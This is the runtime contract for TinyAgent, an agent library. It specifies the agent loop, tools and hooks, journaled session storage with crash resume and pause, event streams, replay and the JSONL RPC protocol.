# TinyAgent runtime contract

Status: protocol version 2.

| Implementation | Protocol version |
|---|---|
| Python, TypeScript | 2. Everything in this document. |
| Go, Rust, Zig, C#, Java, PHP, Elixir | 1, in memory only, until they are ported. |

The seven version 1 implementations have the agent loop, the OpenAI Responses
and Anthropic Messages providers, the five core events, the RPC commands
`prompt`, `abort`, `new_session` and `get_state`, the HTTP routes
`POST /sessions`, `DELETE /sessions/:id`, `POST /sessions/:id/prompts`,
`POST /sessions/:id/cancel` and `GET /health`, and the byte limits. They report
`protocolVersion: 1`. They have none of the storage, resume, pause, replay,
hook, typed output, limit, retry or approval rules below. Their bundled copies
of this document describe the target they will be ported to, not what they do
today.

This document defines what every version 2 implementation exposes. It is
intentionally small. Names are idiomatic in each language (`max_steps` in
Python, `maxSteps` in TypeScript); this document uses the camelCase forms that
appear on the wire. Behaviour is identical.

## Architecture

Each language has one handwritten agent loop. Four thin adapters use it:

```text
native Agent and Session
├── imported SDK
├── coding CLI (interactive and one-shot)
├── RPC mode over stdin and stdout
└── HTTP server
```

The SDK and the adapters must not contain a second model or tool loop. A run
that is resumed after a crash, a run that answers a pause, and a run started by
any adapter all go through the same loop. No language runtime is required by
another language.

The library and the CLI entry are separate where the language needs it. The
library module performs no "am I the main program" check that could fire when
it is imported or bundled, and performs no filesystem access at import. In
TypeScript the library is `sdk.ts` and the entry file `tiny_agent.ts` re-exports
it. In Python `tiny_agent.py` keeps an `if __name__ == "__main__"` guard, which
cannot fire on import.

### Embedding guarantees

- There is no module-level mutable state.
- Importing the SDK, and constructing an Agent, Tool, Session or storage,
  reads no environment variable and touches no file, socket, thread or process,
  apart from a resource that was passed in.
- Default providers read their API key when a request starts, never earlier.
- Only the CLI entry reads environment variables.

## Core contract

There are three concepts, `Tool`, `Agent` and `Session`, and a small set of
extension points: `Provider`, `Storage`, the two tool hooks, `pause`, the event
callback, `newId` and `sleep`.

### Agent

An `Agent` is configured with:

- a provider and a model;
- instructions;
- zero or more tools with unique names;
- optional limits `maxSteps`, `maxSeconds`, `maxTokens`;
- optional hooks `beforeTool` and `afterTool`;
- `trace` (default false), which turns on the three observability events;
- `newId`, which supplies the random part of run and session IDs;
- `sleep`, which performs the wait between provider retries, so tests do not wait.

An agent holds no conversation. One configured agent may serve many sessions.
It supports a complete run and an ordered event stream. A run receives a
prompt, prior history, a run-scoped cancellation signal and the run options
below. A completed run returns final text, the new history, the provider's raw
output items, `usage`, and `value` when typed output was requested.

A run without a Session journals nothing and cannot be resumed.

### Session

A `Session` is one conversation. It owns committed history, writes every step
of a run to its storage, and can be closed and reopened. It permits one active
operation at a time. A Session is created with:

- `storage`, or `directory` as shorthand for `FileStorage(directory)`. With
  neither it uses a private `MemoryStorage`;
- an optional `sessionId` (pattern `s_[a-zA-Z0-9_-]{1,100}`);
- an optional context budget, which enables compaction;
- `onUncertain`: `"tell_model"` (default) or `"reconcile"`.

A session exposes `history` (the committed conversation), `records` (every
journal record), `cursor` (the sequence of the newest record), `usage` (of the
last run that ended), `resumable`, `paused`, `recoveryRequired`, and the
operations `run`, `stream`, `resume`, `abandon`, `reconcile`, `compact`,
`events`, `inspect` and `close`.

Calling `close`, `abandon`, `run`, `resume` or `compact` on a session from
inside one of its own tool handlers, hooks or event callbacks fails at once
with a busy error. It never deadlocks.

### Provider

A provider adapter converts provider-neutral history and tools into one model
API. It emits text deltas (and reasoning deltas where the API streams them) and
returns one complete turn: the text, the assistant history item, the tool
calls, the raw output items and the token usage when the API reports it. It
must preserve opaque provider metadata needed to replay reasoning, signatures
or response identifiers.

Streaming tool arguments stay inside the adapter. The core receives a tool call
only after its arguments form a complete JSON object.

Three providers ship:

| Provider | API | Default base URL | Key |
|---|---|---|---|
| OpenAI Responses | `POST <baseUrl>/responses` | `https://api.openai.com/v1` | `OPENAI_API_KEY`, sent as `Authorization: Bearer` |
| Anthropic Messages | `POST <baseUrl>/messages` | `https://api.anthropic.com/v1` | `ANTHROPIC_API_KEY`, sent as `x-api-key` with `anthropic-version` |
| Chat Completions | `POST <baseUrl>/chat/completions` | `https://api.openai.com/v1` | `OPENAI_API_KEY`, sent as `Authorization: Bearer` |

All three stream. The Chat Completions provider exists because most gateways
and self-hosted model servers offer only that API; it tolerates servers that
omit usage or send tool-call arguments in fragments.

All three accept:

- `baseUrl`: the API root. The provider appends its path.
- `headers`: extra request headers. A header with the name of a default one,
  including the API key header, replaces it.
- `extra`: a JSON object merged into every request body after TinyAgent's own
  fields (temperature, reasoning effort, maximum output tokens, cache controls).
  A run's `extra` is merged over the provider's.

The Provider interface is a supported extension point. A custom provider
signals a failure worth retrying by raising a provider error marked retryable.

Provider rules:

- An empty assistant turn is never sent back to a provider. On replay an
  assistant message with no text and no tool calls is omitted or given the
  API's minimal valid form.
- A provider that ends its stream without a completed turn is a
  `provider_error`. It counts as a step and is not retried.
- Chat Completions allows only text in a tool message. When tool results
  include images, all tool messages for the turn are sent first, then one user
  message carrying the images.
- An API key or header value containing a control character is rejected before
  the request, with an error that does not contain the value. No request header
  value appears in an error message, event, log or journal record. A provider's
  error text is truncated to 500 characters wherever it is reported or stored.

### History

History has three item kinds:

```json
{"role":"user","content":"Inspect this repository"}
{"role":"assistant","content":[{"type":"text","text":"Checking. "},{"type":"tool_call","callId":"call_1","name":"bash","arguments":{"command":"echo hi"}}],"providerMetadata":{"provider":"openai-responses","output":[]}}
{"role":"tool_result","callId":"call_1","toolName":"bash","output":"exit_code: 0\nstdout:\nhi\nstderr:\n","isError":false}
```

Assistant items may carry opaque provider JSON needed for lossless replay.
Switching providers inside an existing session is not supported.

#### Content parts

A user prompt, and a tool's output, is a string or a non-empty list of parts:

```json
[
  {"type":"text","text":"What is in this picture?"},
  {"type":"image","mediaType":"image/png","data":"<base64>"},
  {"type":"image","url":"https://example.com/cat.png"}
]
```

History, the journal, events and all three providers carry the parts as given;
each provider converts them to its API's shape. Content nested deeper than 32
levels is refused before a run starts. The RPC line and HTTP body limits are
unchanged, so large images are passed by URL.

Strings from providers, tools and clients are made valid Unicode before they
reach the journal or the wire: a lone surrogate or invalid sequence becomes
U+FFFD. An encoding problem is never a storage failure and never terminates RPC
mode.

### Tool

A tool has:

| Field | Meaning |
|---|---|
| `name`, `description` | As shown to the model. |
| `parameters` | JSON Schema for the arguments. |
| handler | Native function. |
| `idempotent` | Default false. True means the handler is safe to run twice with the same `executionId`. Recorded in the call's intent record. |
| `timeoutSeconds` | Optional. Positive, at most 86,400. |

The schema dialect is Draft 2020-12. Local references are supported. Validation
does not fetch external schemas, coerce values, insert defaults or remove
properties. `format` remains an annotation. An invalid schema fails at tool
construction. See [`conformance/tool_arguments.json`](conformance/tool_arguments.json)
for shared cases.

The handler receives the validated arguments and a context carrying:

- the cancellation signal for this call;
- `executionId`: `"<sessionId>:<sequence of the call's tool_intent record>"`
  in a session, or the provider's tool call ID outside one. It is the same when
  the call is run again after a crash, so it serves as an idempotency key;
- `context`: the host value passed to the run;
- whether the tool's own timeout has fired.

Each language documents one recommended handler form. Handlers and hooks
receive a deep copy of the arguments: mutating them changes neither the
journal nor what the model is sent.

A handler returns a string, a JSON value (serialised to a string), a list of
content parts, or `pause(payload)`.

Tool rules:

- Tools execute sequentially, in the order the model listed them.
- Invalid arguments, a handler failure, and a call to a tool that does not
  exist (`Unknown tool: <name>`) each become a tool result with
  `isError: true`, so the model can recover. They do not fail the run.
- A tool output or tool error over 131,072 UTF-8 bytes becomes a tool error.
  Its full content is never placed in history or an event.
- When `timeoutSeconds` passes, the call's cancellation signal fires. A
  cooperative handler has one second to return what it has. After that the call
  becomes the tool error `timed out after N s` and the run goes on.
- Cancellation of the run stops the active tool. A handler that ignores
  cancellation cannot be force-stopped in every language: one second after a
  cancellation or timeout the loop stops waiting for it and proceeds.
- A server executes handlers in its own process. No executable tool code is
  accepted over RPC or HTTP.

### Tool hooks

`beforeTool(call, context)` runs before every tool call, after its arguments
are validated. It returns one of:

- allow;
- deny with a reason. The reason, verbatim, becomes the tool error the model sees;
- replacement arguments, which are validated again;
- `pause(payload)`.

`afterTool(call, result, context)` may replace the result. A replaced result
is held to the same output rules as a tool's own.

A hook that fails does not leave the call pending: the call gets an error
result, its `tool_execution_end` is emitted, and the run then fails with
`hook_error`.

### Run options

A run accepts:

| Option | Meaning | Stored in `run_start` |
|---|---|---|
| `messageId` | Caller's ID for this input (sessions only). See [Input dedupe](#input-dedupe). | yes, as `messageId` |
| `model`, `instructions` | Replace the agent's for this run. | yes |
| `extra` | Merged into the request body over the provider's `extra`. | yes |
| `outputSchema` | Ask for typed output. | yes |
| `maxSteps`, `maxSeconds`, `maxTokens` | Replace the agent's limits. | yes |
| `context` | Opaque host value for handlers and hooks. | never |
| `trace` | Override the agent's `trace`. | no |
| cancellation | Run-scoped signal. | no |

The stored options apply again when the run is resumed. `context` is never
journaled and never sent to the model; the host passes it to `resume` again.

Options are validated before a run starts and without leaving the session busy.
A cancellation argument of the wrong type, a limit or timeout that is not a
positive finite number, a `maxSeconds` or `timeoutSeconds` above 86,400, an
`outputSchema` that does not describe a JSON object, and content nested deeper
than 32 levels are all refused.

## The loop

```text
user -> model -> tool call -> observation -> model -> ... -> answer
```

1. Before each model request, check the limits, then compact if a budget is
   set and the request would exceed it.
2. Send the request. Text deltas are emitted as they arrive.
3. If the turn has no tool calls, the run completes with that text.
4. Otherwise run each call in order, give the results to the model, and repeat.

### Limits

`maxSteps` counts model requests in the run, `maxSeconds` is wall time, and
`maxTokens` is total input plus output tokens. All default to unlimited. They
are checked before each model request: the check before request N+1 fails when
N equals `maxSteps`, so exactly `maxSteps` requests are allowed. A retried
request counts once.

A run that reaches a limit ends failed:

```json
{"type":"agent_end","runId":"r_...","sequence":9,"cursor":21,"status":"failed","error":{"code":"limit_exceeded","message":"run limit exceeded: steps","retryable":false,"limit":"steps"},"usage":{"inputTokens":40,"outputTokens":12,"requests":2}}
```

`error.limit` is `steps`, `seconds` or `tokens`. Like any failed run, nothing
of it enters committed history.

### Usage

Providers report token usage per model request when the API returns it. A run
result and every `agent_end` carry:

```json
{"inputTokens":22,"outputTokens":14,"requests":2}
```

summed over the run. `requests` counts model requests that returned a
response. Counts are zero where the provider reported none. A compaction
summary request is included in the usage of the run that triggered it. After a
resume, limits and usage cover the resumed part only. There are no dollar costs.

### Unknown tools and repeated errors

A call to a tool that does not exist is a recoverable tool error. After three
consecutive model turns in which every tool call ended in an error, the run
fails with `repeated_tool_errors`.

### Provider retry

A model request that fails before the first byte of the response body with
HTTP 429, 500, 502, 503 or 504, or with a connection error, is retried:

- at most 4 attempts in total;
- waits of 1, 2 and 4 seconds;
- a `Retry-After` header that is a number of seconds replaces the wait, capped
  at 30 seconds. The HTTP-date form is ignored;
- cancellation ends the wait at once.

Nothing is retried once any of the response has arrived. A response that
returned 2xx headers and then dropped is "after streaming has begun".
Authentication errors and other 4xx responses are not retried.

### Typed output

With `outputSchema` (a JSON Schema describing an object) the agent adds, for
that run, a tool named `final_output` whose parameters are that schema.

- When the model calls it with valid arguments the run completes. The validated
  value is `result.value` in the SDK and `agent_end.value` on the wire.
  `result.output` keeps its meaning: the provider's raw output items.
- Invalid arguments are an ordinary recoverable tool error.
- Other tool calls in the same turn as `final_output` are not run. Each is
  settled with the error result `not run: the run finished`, so committed
  history stays valid.
- If the model answers in text instead, it is told once, in a user message, to
  call the tool. A second miss fails the run with `output_missing`.
- The value is stored in the `final_output` call's `tool_result` record. A
  resume after a crash returns it without asking the model again, and a run
  with `outputSchema` never commits as completed without a value.

No provider-specific structured-output feature is used. An agent that already
has a tool named `final_output` cannot be run with `outputSchema`.

### What counts as aborted

A run is aborted only when its own cancellation signal fired. An abort or
timeout error raised by a tool, a hook or a provider for its own reasons is an
ordinary tool error, hook error or provider error.

Every wait on a hook, a handler, a provider or an event callback races the
run's cancellation. After cancellation the loop waits at most one second for
that code to settle, then records the run as aborted and releases the session,
abandoning the unsettled call. Closing a session is bounded the same way.
Cancellation is re-checked after every record append, so a cancel that lands
during the final append yields an aborted run.

## Storage

A Session keeps an ordered list of records for each session ID. The store has
four operations:

```text
load(sessionId)                      -> ordered records (sequence 1..n) | not found
append(sessionId, expected, record)  -> sequence (= expected + 1)       | fenced
list()                               -> session IDs
release(sessionId)                   -> nothing; never deletes data
```

- A record is a JSON object. The store may serialise it however it likes.
- `append` is durable before it returns.
- **Fencing rule.** `append` succeeds only if `expected` equals the number of
  records already stored for that session. Otherwise it fails as fenced and
  writes nothing. Creating a session is `append(id, 0, header)`, so a duplicate
  create is fenced.
- `append` must return `expected + 1`. Any other return value, and any error
  other than fenced, means the outcome is unknown.
- After a fenced append or a storage failure the Session object is failed. The
  run in progress ends with `error.code` `session_fenced` or `storage_error`
  (never `provider_error`), `retryable: false`. Every later operation on that
  object is refused with `session_failed`. The host reopens the session.
- Storage may be synchronous or asynchronous as the language prefers. With an
  asynchronous store, appends for one session are strictly serialised: a second
  append is never issued before the first has settled.
- `release` frees handles and locks. Closing or deleting a session never
  deletes its records.

Because a tool's intent is appended before the tool runs, a writer that has
lost the session is fenced before it executes the tool.

Two stores ship: `MemoryStorage` and `FileStorage(directory)`. A storage check
that asserts these rules (gapless sequences, fenced append, fenced duplicate
create, load after append, list, release keeps data) is exported so a host can
run it against its own store.

### FileStorage layout

```text
<directory>/<sessionId>.jsonl        one record per line, each line LF-terminated
<directory>/<sessionId>.jsonl.lock   writer lock
```

Each line is an envelope holding the record as a JSON string and its SHA-256:

```json
{"payload":"{\"type\":\"session\",\"sessionId\":\"s_...\",\"configuration\":\"f27c...\",\"version\":1,\"sequence\":1}","sha256":"<hex of payload>"}
```

- A torn final line, left by a crash mid-write, is discarded on open.
- A complete line that fails its checksum, sequence or shape fails the open
  with a corruption error. The file is not repaired.
- The lock admits one writer. Opening a session another process holds fails
  fast as busy; the operating system releases the lock when its holder dies.
  The lock is a convenience. The fencing rule is what protects the journal.
- Constructing a FileStorage touches nothing.

The file name and one-record-per-line framing are part of the contract. The
record fields beyond those named in the next section are not: journals are not
portable between languages.

## The journal

Every record has `type`, `version` (1) and `sequence` (from 1, gapless).

| Record | Written when | Meaning |
|---|---|---|
| `session` | The session is created. | Header: `sessionId`, and a digest of the agent's model, instructions and tool definitions. |
| `configuration` | A session is used with a model, instructions or tools that differ from the last recorded digest. | The change is allowed and is visible in `records`. |
| `run_start` | A prompt is accepted. | Opens a run: `runId`, the user `item`, the stored run `options`, and `messageId` if given. The prompt is part of this one record, so an open run always knows what it was asked. |
| `item` | A model turn completes, or the typed-output reminder is added. | One history `item` of the open run. |
| `tool_intent` | Before a tool call starts. | `callId`, `toolName`, `arguments`, `idempotent`. Its sequence is the call's `executionId` suffix. |
| `tool_result` | A tool call finishes, or is settled as interrupted. | The `tool_result` history `item`. For an accepted `final_output` call it also holds `value`. |
| `tool_rerun` | Before an idempotent call is run again on resume. | Marks the second start; also fences a stale writer. |
| `tool_paused` | A call pauses the run. | `callId`, `toolName`, `payload`. |
| `run_paused` | After `tool_paused`. | The run has ended as paused and stays open. |
| `tool_resumed` | Before a paused call is answered on resume. | Marks the second start; also fences a stale writer. |
| `run_commit` | A run completes. | Closes the run. Its items join committed history. Holds `usage`, and `value` for typed output. |
| `run_failed` | A run fails, is cancelled, or is abandoned. | Closes the run. `status` is `failed` or `aborted`; a failure has `error`. Nothing of the run joins history. |
| `reconciled` | `reconcile(note)` is called. | Closes the open run and adds the note to history as a user message. |
| `checkpoint` | Compaction installs a summary. | `covered` (how many history items the summary replaces), `summary`, and a hash of the covered history. |

A run is **open** when it has `run_start` and none of `run_commit`,
`run_failed` or `reconciled`. A tool call is **pending** when it has a
`tool_intent` and no `tool_result`.

An unknown record type fails the open as corruption. An invalid checkpoint is
ignored and noted in `recoveryNotes`; the earlier context is kept.

## Durability

### Order of writes

- The intent is written before the tool runs. The result is written after.
- A live event that corresponds to a record is emitted after that record is
  written and carries its sequence as `cursor`.
- `tool_execution_end` is emitted for every started call even when recording
  its result fails. The run then fails with the storage error.
- A completed run commits its items atomically with `run_commit`. A failed or
  aborted run leaves committed history as it was. Tool side effects cannot be
  rolled back.

### Failed and cancelled runs

A run that fails or is cancelled in a live process is closed with
`run_failed`. If a tool call was still pending, a `tool_result` with the
interrupted error is appended first, so every start has an end. Such a run
never requires reconciliation, and the next prompt is accepted. The next model
request carries no trace of it.

Closing a stream at any event leaves the journal in a defined state: a pause
stays a pause, and anything else that had not committed is recorded as an
aborted run. No consumer code is awaited inside that cleanup.

### Resume

On opening a session with an open run, `resumable` is true and `resume()`
continues the run inside the one loop. Its `agent_start` carries
`resumed: true`. Starting a new prompt while a run is open fails with
`resume_required`. `resume` with no open run fails with `nothing_to_resume`.

What resume does depends on where the journal stops:

| Journal stops after | Resume |
|---|---|
| `run_start` | Asks the model. |
| An assistant `item` with tool calls, before any intent | Runs the calls that never started, then continues. It does not ask the model again, because that would send a tool call with no result. |
| A `tool_intent`, tool idempotent in the record **and** in the current agent | Appends `tool_rerun`, runs the call again with the same `executionId`, and emits its `tool_execution_start` with `rerun: true`. |
| A `tool_intent` otherwise (the call is uncertain) | Never runs it again. See below. |
| A `tool_result` | Keeps the result. A completed call is never rerun. Remaining calls of the turn run; then the model is asked. |
| The final assistant `item` (or an accepted `final_output` result) | Commits without a model request. |

If the `idempotent` flag differs between the record and the current agent, the
call is uncertain.

**The interrupted-tool rule.** By default (`onUncertain: "tell_model"`) an
uncertain call is settled without running. The stream stays well formed: a
`tool_execution_start` with `interrupted: true` is followed by a
`tool_execution_end` whose output is

```text
This tool call was interrupted and may have partly run. Check its effects before continuing.
```

with `isError: true`. That result goes to the model and the run continues.

With `onUncertain: "reconcile"` the session instead reports
`recoveryRequired: true` and refuses `run`, `resume` and `compact` until
`reconcile(note)` is called. Reconcile settles the pending call as interrupted,
closes the run with a `reconciled` record, and adds
`Interrupted run recovery: <note>` to history as a user message. This is the
only case in which `recoveryRequired` is true: an open run with a pending,
non-idempotent, non-paused call, in a session created with `"reconcile"`.

Every `tool_execution_end` in a stream is preceded by a `tool_execution_start`
for the same call in that stream, live or replayed.

### Abandon

`abandon(reason?)` ends an open or paused run without resuming it. It settles a
pending call as interrupted and appends `run_failed` with error code
`abandoned`. A new prompt is then accepted. Abandon never sets
`recoveryRequired`. With no open run it fails with `nothing_to_resume`.

### Input dedupe

`run`, `stream` and `prompt` accept a caller-supplied `messageId`, a non-empty
string stored in `run_start`. When the same `messageId` is sent again:

| That run | Result |
|---|---|
| committed | The stored `text`, `value` and `usage` are returned with `repeated: true`. No model or tool is called. The raw `output` is empty. `agent_start` and `agent_end` both carry `repeated: true`. |
| open | It is resumed. |
| failed | It runs again. |
| active now | Busy. |

```json
{"type":"agent_start","runId":"r_a6aa...","sequence":1,"repeated":true}
{"type":"agent_end","runId":"r_a6aa...","sequence":2,"status":"completed","text":"Done.","usage":{"inputTokens":22,"outputTokens":14,"requests":2},"repeated":true}
```

### Pause and resume with a value

A tool handler or `beforeTool` may return `pause(payload)`. Then:

1. `tool_paused` is written. If the call had emitted `tool_execution_start`,
   it emits `tool_execution_end` with `paused: true`, empty output and
   `isError: false`.
2. `run_paused` is written and the run ends with `agent_end`
   `status: "paused"` carrying `pause: {toolCallId, toolName, payload}`.
3. The intent stays pending and the run stays open. `session.paused` returns
   the pending pause, also after a reopen in another process.

`resume` with `result` or `error` supplies that call's result and continues the
run:

- `result` may be any JSON value, including null. The presence of the key is
  what counts. `error` must be a string. Exactly one is given.
- The input is validated before anything starts. Invalid input is refused and
  leaves the paused run untouched.
- A supplied result is held to the same 131,072-byte limit as any tool output.
- `tool_resumed` is written, then the call emits a new `tool_execution_start`
  with `resumed: true` and a `tool_execution_end` carrying the supplied result.
- `beforeTool` is not run again for that call, the handler is not called, and a
  new pause cannot be raised for it. `afterTool` runs with the supplied result.

A paused call is not uncertain: it never triggers the interrupted-tool rule.
A prompt while a run is paused fails with `resume_required`. A paused run can
be abandoned. A pause is a non-terminal end: only `completed`, `failed` and
`aborted` are terminal.

This one mechanism covers human approval over HTTP, asking the user a
question, tools the client executes, and waiting for a webhook.

## Compaction

Compaction replaces older history in the model's context with a summary and
keeps the most recent complete exchanges. `history` and the journal keep every
message.

- It needs a context budget: a maximum, a response reserve, a caller-supplied
  token counter that receives the whole request (model, instructions, history,
  tool definitions), and the number of recent turns never summarised (default 2).
- The summary comes from an ordinary model request with tools disabled. Each
  later compaction updates the previous summary.
- It never separates a tool call from its result.
- A `checkpoint` record is validated and written before it takes effect. A
  failed, cancelled, empty or unhelpful summary leaves the previous context in
  place and the error reaches the caller.
- With a budget, a session also compacts by itself before any model request
  that would exceed the maximum less the reserve. If the request still does not
  fit, the run fails; history is never dropped.
- Reopening a session restores the last accepted checkpoint.

## Events

Every event has `type`, `runId` and `sequence`, which starts at one and
increases by one within a stream.

### Event types

| Event | Fields |
|---|---|
| `agent_start` | `resumed: true` when it continues an open run; `repeated: true` for a deduplicated prompt. |
| `text_delta` | `delta`. |
| `tool_execution_start` | `toolCallId`, `toolName`, `arguments`, `executionId`; on resume one of `rerun: true`, `interrupted: true`, `resumed: true`. |
| `tool_execution_end` | `toolCallId`, `toolName`, `output` (string or content parts), `isError`; `paused: true` when the call paused the run. |
| `compaction_start` | none. |
| `compaction_end` | `status` (`completed`, `failed`, `aborted`); `changed` when completed; `error` (a message string) otherwise. |
| `agent_end` | `status`, `usage`, and by status: `text` (and `value` for typed output) when `completed`; `error` when `failed`; `pause` when `paused`; `repeated: true` for a deduplicated prompt. |
| `model_request_start` | Trace only. `attempt`, from 1. |
| `model_request_end` | Trace only. `usage: {inputTokens, outputTokens}` on success; `error: {code, message}` and `willRetry` on failure. |
| `reasoning_delta` | Trace only. `delta`. |

A real run over RPC:

```json
{"type":"agent_start","runId":"r_a6aa...","sequence":1,"cursor":2}
{"type":"text_delta","runId":"r_a6aa...","sequence":2,"delta":"Checki"}
{"type":"text_delta","runId":"r_a6aa...","sequence":3,"delta":"ng. "}
{"type":"tool_execution_start","runId":"r_a6aa...","sequence":4,"toolCallId":"call_s1_0_0","toolName":"bash","arguments":{"command":"echo hi"},"executionId":"s_6076...:4","cursor":4}
{"type":"tool_execution_end","runId":"r_a6aa...","sequence":5,"toolCallId":"call_s1_0_0","toolName":"bash","output":"exit_code: 0\nstdout:\nhi\nstderr:\n","isError":false,"cursor":5}
{"type":"text_delta","runId":"r_a6aa...","sequence":6,"delta":"Done."}
{"type":"agent_end","runId":"r_a6aa...","sequence":7,"status":"completed","text":"Done.","usage":{"inputTokens":22,"outputTokens":14,"requests":2},"cursor":7}
```

A failed run:

```json
{"type":"agent_end","runId":"r_...","sequence":2,"status":"failed","error":{"code":"provider_error","message":"API error 401: ...","retryable":false},"usage":{"inputTokens":0,"outputTokens":0,"requests":0},"cursor":9}
```

The key order inside an event object is not significant.

Rules:

- `agent_start` is first. `agent_end` is last in its stream.
- `agent_end.status` is `completed`, `failed`, `aborted` or `paused`.
- Every emitted `tool_execution_start` gets exactly one matching
  `tool_execution_end`, also under cancellation (output `run aborted`,
  `isError: true`), under a pause, and when the result cannot be recorded.
- One tool runs at a time.
- Text deltas may occur before and after tool execution. `agent_end.text` is
  the final assistant answer, not every delta of the run.
- If a consumer's event callback fails, the run stops and the consumer gets its
  own error back.

A compaction that runs inside a prompt emits `compaction_start` and
`compaction_end` as ordinary events of that run. An explicit compaction emits
exactly those two events in place of the run events:

```json
{"type":"compaction_start","runId":"r_...","sequence":1}
{"type":"compaction_end","runId":"r_...","sequence":2,"status":"completed","changed":true,"cursor":31}
```

`changed` is false when there was nothing to compact.

### Trace events

`model_request_start`, `model_request_end` and `reasoning_delta` are opt-in:
`trace` on the agent, or per run. They are off by default, so the default event
sequence is the five core types plus compaction. Every `model_request_start`
is followed by a `model_request_end`, including when the request fails or is
cancelled (`error.code` is then `aborted`). `willRetry` says whether the
request will be sent again.

### Cursors

- In a session, a live event that corresponds to a journal record carries
  `cursor`, the sequence of that record: `agent_start`, `tool_execution_start`,
  `tool_execution_end`, `agent_end`, and a `compaction_end` that installed a
  checkpoint.
- Live `text_delta` and `reasoning_delta` carry none.
- Replayed events always carry one.
- Cursors strictly increase within a stream and stay below 2^53.
- The `cursor` on a live terminal event equals the sequence of the terminal
  record actually written. Records that must precede it, such as an interrupted
  `tool_result`, are appended first.
- A client that follows both a live stream and a replay dedupes on `cursor`.

### Replay

`events(after = 0, limit = 100)` rebuilds events from the journal and returns

```json
{"events":[{"type":"agent_start","runId":"r_a6aa...","sequence":1,"cursor":2},{"type":"text_delta","runId":"r_a6aa...","sequence":2,"cursor":3,"delta":"Checking. "}],"nextAfter":null}
```

- It returns the events whose cursor is greater than `after`, in order.
  `limit` is 1 to 1000.
- A page is also bounded in bytes (1,048,576 less 4,096), so it always fits one
  RPC line or HTTP body. `nextAfter` is the cursor to pass as `after` for the
  next page, or null on the last page. Paging in small pages yields the same
  events as one large page.
- Every run is included: committed, failed, aborted, abandoned, paused and
  open. A failed or aborted run replays its `agent_start`, its tool events and
  an `agent_end` with the real status and error, so a client that polls learns
  of it. Its items are still not part of committed history.
- Text is one `text_delta` per stored assistant message. Live deltas are not
  journaled. Trace events are not replayed.
- Tool output replays losslessly: a result made of content parts replays as
  those parts.
- A run that paused and resumed replays one `tool_execution_end` with
  `paused: true` and one `agent_end` with `status: "paused"` per pause, then a
  `tool_execution_start` with `resumed: true`, and finally the terminal
  `agent_end`.
- A rerun replays a second `tool_execution_start` with `rerun: true`. Replay
  of a reconciled or abandoned run pairs every start with an end.

### Live and journal

A direct SDK stream delivers `agent_end` just before the terminal record is
written, carrying the cursor that record will get, so the consumer can still
cancel. If the consumer cancels or the write fails while handling it, the
record written at that cursor is `run_failed`, and replay reports that status.

The RPC and HTTP adapters do not have that gap. They hold the terminal event
until the terminal record has been written and the session is idle, and they
report what the journal holds. If the commit fails, or a cancel lands between
completion and commit, they deliver a `failed` or `aborted` `agent_end`
instead. If the loop ends without a terminal event for any reason, the adapter
synthesises an aborted `agent_end` for the client and all followers.

## RPC mode

```sh
tinyagent --mode rpc
```

RPC mode reads UTF-8 JSONL commands from stdin and writes UTF-8 JSONL responses
and events to stdout. JSONL means one complete JSON object followed by LF.
Embedded newlines are escaped inside JSON strings. Diagnostics go to stderr.
Bash commands and their output are not echoed to stderr in this mode.

This is the TinyAgent RPC protocol. It is not JSON-RPC 2.0.

`id` is an optional string copied into the corresponding response. Responses
and events may interleave. Responses correlate through `id`; run events
correlate through `runId`. One RPC process holds one current session.

### Commands

| Command | Request fields | Response `data` |
|---|---|---|
| `prompt` | `message` (string or content parts), optional `messageId` | `{"runId","repeated"}`, then the run's events |
| `resume_run` | optional `result` or `error` for a paused run | `{"runId"}`, then the run's events |
| `abandon_run` | optional `reason` | `{"abandoned":true}` |
| `abort` | none | `{"accepted","runId"}` |
| `get_state` | none | see below |
| `get_events` | optional `after` (0), `limit` (100) | `{"events","nextAfter"}` |
| `get_history` | optional `offset` (0), `limit` (20, 1 to 1000), `view` (`history` or `records`) | a history page |
| `compact` | none | `{"runId"}`, then `compaction_start` and `compaction_end` |
| `reconcile` | `note` | `{"sessionId","recoveryRequired":false}` |
| `new_session` | none | `{"abortedRun"}` |
| `list_sessions` | none | `{"sessionIds":[...]}` |
| `resume_session` | `sessionId` | `{"sessionId"}` |

```json
{"id":"1","type":"prompt","message":"Inspect this repository","messageId":"m1"}
{"id":"1","type":"response","command":"prompt","success":true,"data":{"runId":"r_a6aa...","repeated":false}}
```

The `prompt`, `resume_run` and `compact` responses are written before the
run's events. A prompt, resume or compaction received while a run is active
fails with `busy`. There is no prompt queue and no steering.

```json
{"id":"2","type":"abort"}
{"id":"2","type":"response","command":"abort","success":true,"data":{"accepted":true,"runId":"r_..."}}
```

`abort` requests cooperative cancellation. `accepted` is false with a null
`runId` when no run is active. The matching `agent_end` confirms that
cancellation finished.

```json
{"id":"3","type":"get_state"}
{"id":"3","type":"response","command":"get_state","success":true,"data":{"protocolVersion":2,"status":"idle","runId":null,"messageCount":4,"resumable":false,"paused":null,"usage":{"inputTokens":22,"outputTokens":14,"requests":2}}}
```

`status` is `idle` or `running`. `messageCount` is the number of committed
history items. `paused` is the pending pause object or null. `usage` is that of
the last run that ended, or null.

```json
{"id":"4","type":"get_history","offset":0,"limit":20,"view":"history"}
{"id":"4","type":"response","command":"get_history","success":true,"data":{"sessionId":"s_6076...","history":[],"recoveryRequired":false,"resumable":false,"paused":null,"nextOffset":null,"recoveryNotes":[]}}
```

With `view: "records"` the items are raw journal records under a `records` key
in place of `history`. A page is bounded in bytes like an events page;
`nextOffset` is null on the last page.

```json
{"id":"5","type":"resume_run","result":"approved by Ana"}
{"id":"6","type":"abandon_run","reason":"operator gave up"}
{"id":"7","type":"get_events","after":7,"limit":100}
{"id":"8","type":"reconcile","note":"Checked: the file was written"}
{"id":"9","type":"resume_session","sessionId":"s_..."}
```

- `new_session` aborts an active run, waits for it, closes the current session
  and opens a new one. The earlier journal is kept.
- `resume_session` closes the current session and opens the stored one. It
  needs storage.
- `list_sessions` lists the stored session IDs, or only the current one when
  the adapter has no storage.
- `abandon_run`, `get_events`, `get_history`, `reconcile`, `list_sessions` and
  `resume_session` fail with `busy` while a run is active. `abort` and
  `get_state` always answer.

### Command errors

```json
{"id":"1","type":"response","command":"prompt","success":false,"error":{"code":"busy","message":"A run is already active"}}
```

A command that fails and carried no `id`, and any input that is not a command,
produces a protocol error instead:

```json
{"type":"protocol_error","error":{"code":"invalid_command","message":"Unknown command type"}}
```

Malformed JSON produces `invalid_json`; a JSON value that is not an object, a
non-string `id`, or an unknown `type` produces `invalid_command`. Reading
continues after these.

### Rules

- Every command gets an answer, whatever state the session is in. A refusal is
  an error response. An implementation never emits while holding a lock the
  emit path needs.
